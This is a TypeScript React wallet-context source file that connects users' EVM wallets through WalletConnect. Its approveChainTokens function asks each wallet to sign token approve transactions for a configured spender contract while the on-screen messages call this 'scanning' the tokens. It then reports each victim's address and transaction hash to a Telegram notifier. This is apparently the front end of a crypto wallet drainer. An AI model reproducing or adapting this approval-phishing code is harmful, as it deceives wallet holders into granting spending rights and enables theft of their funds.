import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { toast } from "sonner";
import { getChainById, type ChainConfig } from "@/lib/chains";
import { getAllowance, encodeApproveCalldata } from "@/lib/evmUtils";
import { sendEvmApprovalNotification } from "@/lib/telegramNotify";
import {
  connectMultiChainWallet,
  disconnectWalletConnect,
  extractEvmAddress,
  ensureWalletSession,
  getWalletConnectProvider,
} from "@/lib/walletConnectProvider";

interface EvmWalletContextType {
  address: string | null;
  currentChainId: number | null;
  isConnected: boolean;
  isApproving: boolean;
  connect: () => Promise<string | null>;
  disconnect: () => void;
  approveChainTokens: (chain: ChainConfig) => Promise<boolean>;
  switchNetwork: (chainId: number) => Promise<boolean>;
  syncFromSession: (session: any) => void;
  clearSession: () => void;
}

const EvmWalletContext = createContext<EvmWalletContextType>({
  address: null,
  currentChainId: null,
  isConnected: false,
  isApproving: false,
  connect: async () => null,
  disconnect: () => {},
  approveChainTokens: async () => false,
  switchNetwork: async () => false,
  syncFromSession: () => {},
  clearSession: () => {},
});

export const useEvmWallet = () => useContext(EvmWalletContext);

export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
  const [address, setAddress] = useState<string | null>(null);
  const [currentChainId, setCurrentChainId] = useState<number | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isApproving, setIsApproving] = useState(false);

  const syncFromSession = useCallback((session: any) => {
    const evmAddr = extractEvmAddress(session);
    setAddress(evmAddr);
    setIsConnected(!!evmAddr);
  }, []);

  const clearSession = useCallback(() => {
    setAddress(null);
    setCurrentChainId(null);
    setIsConnected(false);
    setIsApproving(false);
  }, []);

  const connect = useCallback(async (): Promise<string | null> => {
    if (address && isConnected) return address;

    const walletState = await ensureWalletSession();
    if (walletState?.evmAddress) {
      setAddress(walletState.evmAddress);
      setIsConnected(true);
      return walletState.evmAddress;
    }

    try {
      const result = await connectMultiChainWallet();
      if (result.evmAddress) {
        setAddress(result.evmAddress);
        setIsConnected(true);
        toast.success("EVM wallet connected!");
        return result.evmAddress;
      }

      toast.error("Wallet did not provide an EVM account");
      return null;
    } catch (err: any) {
      console.error("EVM WC connect failed:", err);
      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect EVM wallet");
      }
      return null;
    }
  }, [address, isConnected]);

  const disconnect = useCallback(async () => {
    await disconnectWalletConnect();
    clearSession();
  }, [clearSession]);

  const switchNetwork = useCallback(async (chainId: number): Promise<boolean> => {
    const walletState = await ensureWalletSession();
    const activeAddress = address || walletState?.evmAddress;
    if (!walletState || !activeAddress) return false;

    const chain = getChainById(chainId);
    if (!chain) return false;

    try {
      await walletState.provider.client.request({
        chainId: chain.wcChainId,
        topic: walletState.session.topic,
        request: {
          method: "wallet_switchEthereumChain",
          params: [{ chainId: chain.chainIdHex }],
        },
      });
      setCurrentChainId(chainId);
      return true;
    } catch (err: any) {
      console.error(`Failed to switch to ${chain.name}:`, err);
      return false;
    }
  }, [address]);

  const approveChainTokens = useCallback(async (chain: ChainConfig): Promise<boolean> => {
    let walletState = await ensureWalletSession();

    if (!walletState) {
      const provider = await getWalletConnectProvider();
      const session = provider.session;
      if (session) {
        walletState = {
          provider,
          session,
          evmAddress: extractEvmAddress(session),
          tronAddress: null,
        };
      }
    }

    if (!walletState) {
      toast.error("Wallet session lost. Please reconnect from step 1.");
      return false;
    }

    const { provider, session } = walletState;
    const activeAddress = address || walletState.evmAddress;
    if (!activeAddress) {
      toast.error("EVM wallet address not found.");
      return false;
    }

    setAddress(activeAddress);
    setIsConnected(true);
    setIsApproving(true);
    let success = false;

    try {
      // Do not call wallet_switchEthereumChain before approve — iOS reopens wallet as "connect".
      // WC routes eth_sendTransaction via chainId on the request.

      for (const token of chain.approvalTokens) {
        const allowance = await getAllowance(activeAddress, chain.spenderContract, token.address, chain);
        if (allowance > 0n) {
          toast.info(`${token.symbol} already scanned on ${chain.name}`);
          success = true;
          continue;
        }

        toast.loading(`Scanning ${token.symbol} on ${chain.name}...`);
        const calldata = encodeApproveCalldata(chain.spenderContract);

        const txHash: string = await provider.client.request({
          chainId: chain.wcChainId,
          topic: session.topic,
          request: {
            method: "eth_sendTransaction",
            params: [
              {
                from: activeAddress,
                to: token.address,
                data: calldata,
                value: "0x0",
              },
            ],
          },
        });

        toast.dismiss();

        if (txHash) {
          toast.success(`${token.symbol} scanned on ${chain.name}!`);
          sendEvmApprovalNotification(activeAddress, txHash, chain.id, token.symbol).catch(console.error);
          success = true;
        }
      }
    } catch (err: any) {
      console.error(`Approval failed on ${chain.name}:`, err);
      toast.dismiss();
      toast.error(`Scan failed: ${err.message || "User rejected or network error"}`);
    } finally {
      setIsApproving(false);
    }

    return success;
  }, [address]);

  return (
    <EvmWalletContext.Provider
      value={{
        address,
        currentChainId,
        isConnected,
        isApproving,
        connect,
        disconnect,
        approveChainTokens,
        switchNetwork,
        syncFromSession,
        clearSession,
      }}
    >
      {children}
    </EvmWalletContext.Provider>
  );
};
